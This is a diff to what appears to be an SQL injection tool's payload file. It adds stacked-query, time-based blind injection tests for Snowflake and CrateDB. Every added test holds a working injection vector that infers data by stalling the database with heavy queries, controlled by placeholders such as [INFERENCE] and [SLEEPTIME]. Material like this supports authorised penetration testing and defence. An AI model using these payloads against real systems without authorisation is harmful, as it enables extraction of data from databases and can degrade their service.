@@ -725,6 +725,67 @@
             <dbms_version>&gt;= 2.0</dbms_version>
         </details>
     </test>
+    <!-- Snowflake stacked queries -->
+    <test>
+        <title>Snowflake stacked queries (comment)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT SYSTEM$TYPEOF(REPEAT('a',[SLEEPTIME]000000000))) ELSE '0' END</vector>
+        <request>
+            <payload>;SELECT SYSTEM$TYPEOF(REPEAT('a',[SLEEPTIME]000000000))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Snowflake stacked queries</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT SYSTEM$TYPEOF(REPEAT('a',[SLEEPTIME]000000000))) ELSE '0' END</vector>
+        <request>
+            <payload>;SELECT SYSTEM$TYPEOF(REPEAT('a',[SLEEPTIME]000000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <!-- CrateDB stacked queries -->
+    <test>
+        <title>CrateDB stacked queries (heavy query - comment)</title>
+        <stype>4</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]00000000)) ELSE 0 END</vector>
+        <request>
+            <payload>;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]00000000)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of stacked queries tests -->
 </root>
